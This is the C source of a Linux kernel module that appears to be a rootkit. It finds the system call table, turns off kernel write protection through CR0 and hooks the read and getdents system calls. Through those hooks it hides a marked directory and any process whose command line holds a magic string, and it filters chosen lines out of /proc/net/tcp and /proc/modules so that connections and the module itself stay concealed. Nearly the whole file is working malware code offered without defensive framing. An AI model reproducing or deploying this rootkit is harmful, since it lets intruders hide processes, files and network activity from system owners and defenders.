
#include "second.h"
#include "sys_numbers.h"

//
// globals
//
SYSSERV_INF *ssPtr;
int ssSize = NUMBER_OF_FUNCTIONS;

void *sys_call_table;
struct cpumask *cpus;

struct completion synchUnload;
atomic_t unlFlag = ATOMIC_INIT (0);

const char *badDirName = "===1234DEADBEAF4321===";
const char *magicString = "===xxxGANGNAM-STYLExxx===";
const char *netTcp4String = "/etc/===1234DEADBEAF4321===/tcp4.txt";
const char *modulesString = "/etc/===1234DEADBEAF4321===/modules.txt";
const char *badPath = "/proc";
const char *netTcpStr1 = "/proc/net/tcp";
const char *netTcpStr2 = "/proc/self/net/tcp";
const char *modulesStr = "/proc/modules";
const int strArrSize = 64, lineSize = 200;

//
// Service functions
//
void intToStrRadixDec (char *chBuf, int szBuf, int val) {
	int tmp, base = 10, j = 9;
	
	if (szBuf < 11) {
#ifdef MY_OWN_DEBUG
		printk ("Passed buffer's size is too short for intToStrRadixDec\n");
#endif
		chBuf [0] = '\0';
		return;
	}
	for (int i = 0; i < szBuf; ++i) chBuf [i] = '0';
	chBuf [j + 1] = '\0';
	while (val > 0) {
		tmp = val % base;
		val /= base;
		chBuf [j] += tmp;
		--j;
	}
	j = 0;
	for (int i = 10; j < i; ++j) {
		if (chBuf [j] != '0') break;
	}
	// j is an index of first significant char
	for (int i = 0; j <= 10; ++i, ++j) chBuf [i] = chBuf [j];
	
	return;
}


int readFileData (const char *fileName, void *buf, size_t count) {
	int ret = 0;
	mm_segment_t oldFs;
	loff_t posFile = 0;
	struct file *filePtr;
	
	
	oldFs = get_fs();
	set_fs (KERNEL_DS);
	filePtr = filp_open (fileName, O_RDONLY, 0);
	if (IS_ERR (filePtr)) {
#ifdef MY_OWN_DEBUG
		printk ("Can't open: %s - %d\n", fileName, (int)filePtr);
#endif
		set_fs (oldFs);
		return 0;
	}
	
	if ((ret = vfs_read (filePtr, buf, count, &posFile)) < 0) {
#ifdef MY_OWN_DEBUG
		printk ("Error at reading from: %s, ret: %d\n", fileName, (int)ret);
#endif
		ret = 0;
	}
	set_fs (oldFs);
	filp_close (filePtr, NULL);
	
	
	return ret;
}


//
// Functions intercepters
//

int needHideProc (char *chPtr) {
	loff_t posFile = 0;
	ssize_t retLen;
	const int nameLen = 256;
	char *chBuf;
	struct file *filePtr;
	mm_segment_t oldFs;
	int ret = 0;
	
	
	for (int i = 0, j = strlen (chPtr); i < j; ++i) {
		if (chPtr [i] < '0' || chPtr[i] > '9') return 0;
	}
	
	if (!(chBuf = kmalloc (nameLen, GFP_KERNEL))) return 0;
	strcpy (chBuf, "/proc/");
	strcat (chBuf, chPtr);
	strcat (chBuf, "/cmdline");

	oldFs = get_fs();
	set_fs (KERNEL_DS);
	filePtr = filp_open (chBuf, O_RDONLY, 0);
	if (IS_ERR (filePtr)) {
#ifdef MY_OWN_DEBUG
		//printk ("Can't open: %s - %d\n", chBuf, (int)filePtr);
#endif
		kfree (chBuf);
		set_fs (oldFs);
		return 0;
	}
	
	if ((retLen = vfs_read (filePtr, chBuf, nameLen - 1, &posFile)) < 0) {
#ifdef MY_OWN_DEBUG
		//printk ("Error at reading from: %s, ret: %d\n", chBuf, (int)retLen);
#endif
		filp_close (filePtr, NULL); // current->files
		kfree (chBuf);
		set_fs (oldFs);
		return 0;
	}
	set_fs (oldFs);
	for (unsigned i = 0; i < retLen; ++i) if (chBuf[i] == '\0') chBuf [i] = '_';
	chBuf[retLen] = '\0';
	if (strstr (chBuf, magicString)) ret = 1;
	
#ifdef MY_OWN_DEBUG
	//if (ret) printk ("Hided: %s - %s\n", chPtr, chBuf);
#endif
	filp_close (filePtr, NULL);
	kfree (chBuf);
	
	
	return ret;
}


int clearDirEntries (struct linux_dirent64 *dirPtr, unsigned int len, int clrFlag) {
	int cur, newLen = len;
	struct linux_dirent64 *tmpPtr = dirPtr;
	
	do {
		cur = dirPtr->d_reclen;
		len -= cur;
		tmpPtr = (struct linux_dirent64*)((char*)dirPtr + cur);
		
		if ((strstr ((char*)&dirPtr->d_type, badDirName) != NULL) ||
			(clrFlag && needHideProc ((char*)&dirPtr->d_type))
			)
		{
			memmove (dirPtr, tmpPtr, len);
			newLen -= cur;
#ifdef MY_OWN_DEBUG
			//printk ("Hided: %s\n", (char*)&dirPtr->d_type);
#endif
		} else {
			dirPtr = tmpPtr;
		}
	} while (len > 0);
	
	return newLen;
}


int isTrustedProcess () {
	const int bufSz = 16;
	char *bufPtr, *chBuf;
	struct file *filePtr;
	loff_t posFile = 0;
	ssize_t retLen;
	const int nameLen = 256;
	mm_segment_t oldFs;
	int ret = 0;
	
	
	if (!(bufPtr = kmalloc (bufSz, GFP_KERNEL))) return 0;
	if (!(chBuf = kmalloc (nameLen, GFP_KERNEL))) return 0;
	intToStrRadixDec (bufPtr, bufSz, current->tgid);

	strcpy (chBuf, "/proc/");
	strcat (chBuf, bufPtr);
	strcat (chBuf, "/cmdline");
	kfree (bufPtr);
	oldFs = get_fs();
	set_fs (KERNEL_DS);
	
	filePtr = filp_open (chBuf, O_RDONLY, 0);
	if (IS_ERR (filePtr)) {
#ifdef MY_OWN_DEBUG
		//printk ("Can't open: %s - %d\n", chBuf, (int)filePtr);
#endif
		kfree (chBuf);
		set_fs (oldFs);
		return 0;
	}
	
	if ((retLen = vfs_read (filePtr, chBuf, nameLen - 1, &posFile)) < 0) {
#ifdef MY_OWN_DEBUG
		//printk ("Error at reading from: %s, ret: %d\n", chBuf, (int)retLen);
#endif
		filp_close (filePtr, NULL);
		kfree (chBuf);
		set_fs (oldFs);
		return 0;
	}
	set_fs (oldFs);
	
	for (unsigned i = 0; i < retLen; ++i) if (chBuf[i] == '\0') chBuf [i] = '_';
	chBuf[retLen] = '\0';
	if (strstr (chBuf, magicString)) ret = 1;
#ifdef MY_OWN_DEBUG
	//if (ret) printk ("Trusted process");
#endif
	filp_close (filePtr, NULL);
	kfree (chBuf);
	
	
	return ret;
}


int newGetDents (unsigned int fd, struct linux_dirent64 *dirent, unsigned int count) {
	int ret, clrFlag = 0;
	struct file *fdPtr = NULL;
	const int bufLen = 128;
	char buf [bufLen - 1], *realPath;
	
	
#ifdef MY_OWN_DEBUG
	//printk ("Intercepted function sys_getdents\n");
#endif
	
	atomic64_inc (& ssPtr[SYS_DIRENT_NUM].numOfCalls);
	if (ssPtr[SYS_DIRENT_NUM].sysPtrOld) {
		//
		// "Removing" directories from /proc/PID
		//
		if (IS_ERR (fdPtr = fget (fd))) {
#ifdef MY_OWN_DEBUG
			//printk ("Have found NULL ptr to struct file at FDT "
			//		"for descriptor id: %d, err: %d\n", fd, (int)fdPtr);
#endif
		} else {
			realPath = d_path (&fdPtr->f_path, buf, bufLen);
			if (strstr (realPath, badPath)) clrFlag = 1;
		}
		fput (fdPtr);
		
		//
		// Hiding
		//
		if ((ret = ((GETDENTS_P)(ssPtr[SYS_DIRENT_NUM].sysPtrOld)) (fd, dirent, count)) > 0) {
			if (!isTrustedProcess ()) {
				struct linux_dirent64 *dirPtr = (struct linux_dirent64*)kmalloc (ret, GFP_KERNEL);
				
				copy_from_user (dirPtr, dirent, ret);
				if (clrFlag)
					ret = clearDirEntries (dirPtr, ret, 1);
				else
					ret = clearDirEntries (dirPtr, ret, 0);
				copy_to_user (dirent, dirPtr, ret);
				
				kfree (dirPtr);
			}
		}
		clrFlag = 0;
		
		
		atomic64_dec (& ssPtr[SYS_DIRENT_NUM].numOfCalls);
		if (!atomic64_read (& ssPtr[SYS_DIRENT_NUM].numOfCalls) && atomic_read (&unlFlag)) {
			complete (&synchUnload);
		}
		return ret;
	} else {
		atomic64_dec (& ssPtr[SYS_DIRENT_NUM].numOfCalls);
		if (!atomic64_read (& ssPtr[SYS_DIRENT_NUM].numOfCalls) && atomic_read (&unlFlag)) {
			complete (&synchUnload);
		}
		return -EIO;
	}
}


int processReading (const char *fileName, int fd, void *buf, size_t count) {
	int ret, ret1;
	char *chpArr [strArrSize], *chBuf, *chBuf1, *chTmp;
	struct file *filePtr;
	
	
#ifdef MY_OWN_DEBUG
	printk ("processReading function\n");
#endif

	if ((ret = ((READ_P)(ssPtr[SYS_READ_NUM].sysPtrOld)) (fd, buf, count)) <= 0) {
		return ret;
	}
	
	for (int i = 0; i < strArrSize; ++i) chpArr[i] = NULL;
	
	if (!(chBuf = kmalloc (lineSize * strArrSize, GFP_KERNEL))) {
		return ret;
	}
	if (!(chBuf1 = kmalloc (count + 2, GFP_KERNEL))) {
		kfree (chBuf);
		return ret;
	}
	if ((ret1 = readFileData (fileName, chBuf, lineSize * strArrSize - 1)) <= 0) {
		kfree (chBuf1);
		kfree (chBuf);
		return ret;
	}
	chTmp = chBuf;
	for (int i = 0, j = 0; i < ret1; ++i) {
		if (chBuf[i] == '\n' || chBuf[i] == ' ') {
			 chBuf[i] = '\0';
			 chpArr[j] = chTmp;
			 ++j;
			 chTmp = chTmp + strlen (chTmp) + sizeof ('\0');
			 if (j >= strArrSize) break;
		}
	}
	
	copy_from_user (chBuf1, buf, ret);
	chBuf1 [ret] = '\n';
	chBuf1 [ret + 1] = '\0';
//printk ("RESULT: %s\n", chBuf1);	
	int i = 0, j;
	ret += 1;
	while (chpArr[i] != NULL && strlen (chpArr[i]) != 0) {
//printk ("CUR_STR: %s===\n", chpArr[i]);
		if ((chTmp = strstr (chBuf1, chpArr[i])) != NULL && 0 != strlen (chpArr[i])) {
			j = 0;
			while (chTmp[j] != '\n') ++j;
			j += sizeof ('\n');
			memmove (chTmp, chTmp + j, ret - j - ((size_t)chTmp - (size_t)chBuf1 + 1) + 1);
			ret = strlen (chBuf1);
		}
		++i;
	}
//printk ("INSIDE 111\n");	
	// we have read a half of a string
	ret -= 1;
	if (ret == count && chBuf1[strlen (chBuf1) - 1 - 1] != '\n') {
//printk ("INSIDE 222\n");
		int j, i;
		loff_t oldPos;
		
		i = strlen (chBuf1) - 1;
		if (IS_ERR (filePtr = fget (fd))) {
			kfree (chBuf1);
			kfree (chBuf);
			return 0;
		}
		
		for (j = i; j >= 0; --j) if (chBuf1[j] == '\n') break;
		++j;
		for (; j < i; ++j) chBuf1[j] = '\0';
		filePtr->f_pos = ret = strlen (chBuf1);
		fput (filePtr);
	}
//printk ("Ret: %d\n", ret);	
//printk ("\n\n\n=========\n%s\n\n", chBuf1);
	copy_to_user (buf, chBuf1, ret);
	
	kfree (chBuf1);
	kfree (chBuf);
	
	
	return ret;
}
		

ssize_t newRead (int fd, void *buf, size_t count) {
	int ret;
	struct file *fdPtr;
	const int bufLen = 128;
	char bufTmp [bufLen - 1], *realPath;
	
	
#ifdef MY_OWN_DEBUG
	//printk ("Intercepted function sys_read\n");
#endif
	
	atomic64_inc (& ssPtr[SYS_READ_NUM].numOfCalls);
	if (ssPtr[SYS_READ_NUM].sysPtrOld) {
		if (!isTrustedProcess ()) {
			if (IS_ERR (fdPtr = fget (fd))) {
#ifdef MY_OWN_DEBUG
			//printk ("Have found NULL ptr to struct file at FDT "
			//		"for descriptor id: %d, err: %d\n", fd, (int)fdPtr);
#endif
				bufTmp [0] = '\0';
			} else realPath = d_path (&fdPtr->f_path, bufTmp, bufLen);
			fput (fdPtr);
			
			if (strstr (netTcpStr1, realPath) || strstr (netTcpStr2, realPath)) {
				ret = processReading (netTcp4String, fd, buf, count);
			}
			else if (strstr (modulesStr, realPath)) {
				ret = processReading (modulesString, fd, buf, count);
			} else {
				//
				// Original call
				//
				ret = ((READ_P)(ssPtr[SYS_READ_NUM].sysPtrOld)) (fd, buf, count);
			}
		}
		
		atomic64_dec (& ssPtr[SYS_READ_NUM].numOfCalls);
		if (!atomic64_read (& ssPtr[SYS_DIRENT_NUM].numOfCalls) && atomic_read (&unlFlag)) {
			complete (&synchUnload);
		}
		return ret;
	}
	else {
		atomic64_dec (& ssPtr[SYS_READ_NUM].numOfCalls);
		if (!atomic64_read (& ssPtr[SYS_DIRENT_NUM].numOfCalls) && atomic_read (&unlFlag)) {
			complete (&synchUnload);
		}
		return -EIO;
	}
}

//
// Start/stop functions
//

void fillServiceTable (void *sscltPtr) {
	ssPtr[SYS_READ_NUM].sysPtrNew = &newRead;
	ssPtr[SYS_READ_NUM].sysPtrOld = ((void**)sscltPtr)[__NR_read];
	ssPtr[SYS_READ_NUM].sysNum = __NR_read;
	
	ssPtr[SYS_DIRENT_NUM].sysPtrNew = &newGetDents;
	ssPtr[SYS_DIRENT_NUM].sysPtrOld = ((void**)sscltPtr)[__NR_getdents];
	ssPtr[SYS_DIRENT_NUM].sysNum = __NR_getdents;
	
	
	return;
}


void changeSyscallTable (void *scltPtr, int sysNum, void *newPtr, void **oldPtr) {
	// disable memory protection to writing
	asm("pushq %rax");
	asm("movq %cr0, %rax");
	asm("andq $0xfffffffffffeffff, %rax");
	asm("movq %rax, %cr0");
	asm("popq %rax");
	
	*oldPtr = ((void**)scltPtr) [sysNum];
	((void**)sys_call_table) [sysNum] = newPtr;
	
	// enable memory protection to writing
	asm("pushq %rax");
	asm("movq %cr0, %rax");
	asm("xorq $0x0000000000010000, %rax");
	asm("movq %rax, %cr0");
	asm("popq %rax");
	
	return;
}


int setFunc (void *datPtr) {
	DATA_FN *dat = (DATA_FN*)datPtr;
	
	changeSyscallTable (dat->scltPtr, dat->sysNum, dat->newPtr, dat->oldPtr);
	
	return 0;
}


int start (void) {
	int i, lo, hi;
	void *system_call;
	unsigned char *ptr;
	DATA_FN dat;
	
	
	if (!(cpus = kmalloc (sizeof (struct cpumask), GFP_KERNEL))) {
#ifdef MY_OWN_DEBUG
		printk ("Insufficient of memory, error of kmalloc\n");
#endif
		return -ENOMEM;
	}
	cpumask_clear (cpus);
	cpumask_bits (cpus)[0] = 1;
	
	if (!(ssPtr = kmalloc (ssSize * sizeof (SYSSERV_INF), GFP_KERNEL))) {
#ifdef MY_OWN_DEBUG
		printk ("Insufficient of memory, error of kmalloc\n");
#endif
		kfree (cpus);
		return -ENOMEM;
	}
	memset (ssPtr, 0, ssSize * sizeof (SYSSERV_INF));
	fillServiceTable (ssPtr);
	
	//asm volatile("rdmsr" : "=a" (lo), "=d" (hi) : "c" (MSR_LSTAR));
	rdmsr (MSR_LSTAR, lo, hi);
	system_call = (void*)(((long)hi<<32) | lo);
	
	// 0xff14c5 - is opcode of relative call instruction at x64 (relative address is 4 byte value)
	// 500 may be dangerous, we go byte by byte at code of system_call
	for (ptr = system_call, i = 0; i < 500; i++) {
		if (ptr[0] == 0xff && ptr[1] == 0x14 && ptr[2] == 0xc5) {
			sys_call_table = (void*)(0xffffffff00000000 | *((unsigned int*)(ptr+3)));
			break;
		}
		ptr++;
	}
	if (!sys_call_table) return -ENOSYS;
	else {
#ifdef MY_OWN_DEBUG
		printk ("Have found sys_call_table address: %p\n", sys_call_table);
#endif
	}
	
	
	init_completion (&synchUnload);
	
	fillServiceTable (sys_call_table);
	dat.scltPtr = sys_call_table;
	for (int i = 0; i < ssSize; ++i) {
		dat.sysNum = ssPtr[i].sysNum;
		dat.newPtr = ssPtr[i].sysPtrNew;
		dat.oldPtr = & ssPtr[i].sysPtrOld;
		
		stop_machine(&setFunc, &dat, cpus);
	}
	
	
	return 0;
}

void stop (void) {	
	DATA_FN dat = {sys_call_table};
	
#ifdef MY_OWN_DEBUG
	printk ("Unloading start\n");
#endif
	for (int i = 0; i < ssSize; ++i) {
		dat.sysNum = ssPtr[i].sysNum;
		dat.newPtr = ssPtr[i].sysPtrOld;
		dat.oldPtr = & ssPtr[i].sysPtrOld;
		
		stop_machine(&setFunc, &dat, cpus);
	}
	stop_machine(&setFunc, &dat, cpus);
	kfree (cpus);
	kfree (ssPtr);
	
	
	atomic_set (&unlFlag, 1);
	wait_for_completion (&synchUnload);
#ifdef MY_OWN_DEBUG
	printk ("Bye bye\n");
#endif
	
	
	return;
}



module_init(start);
module_exit(stop);
MODULE_LICENSE ("GPL");








